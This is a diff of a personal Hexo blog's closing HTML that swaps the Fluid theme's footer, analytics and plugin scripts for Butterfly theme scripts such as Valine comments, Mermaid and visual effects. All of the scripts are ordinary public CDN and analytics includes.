-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/yhy0" target="_blank" rel="nofollow noopener"><span>YHY</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
-  </div>
-
-
-  
-
-  
-</footer>
-
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'default',
+      })
+      false && mermaid.init()
     })
-  </script>
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz',
+      appKey: 'GB9a9tvf5zPbYaxUShE01qk1',
+      avatar: 'robohash',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
 
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
 
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      $('#local-search-input').on('click', function() {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      });
-      $('#modalSearch').on('shown.bs.modal', function() {
-        $('#local-search-input').focus();
-      });
-    })()
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    <!-- Baidu Analytics -->
-    <script defer>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-</body>
-</html>
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
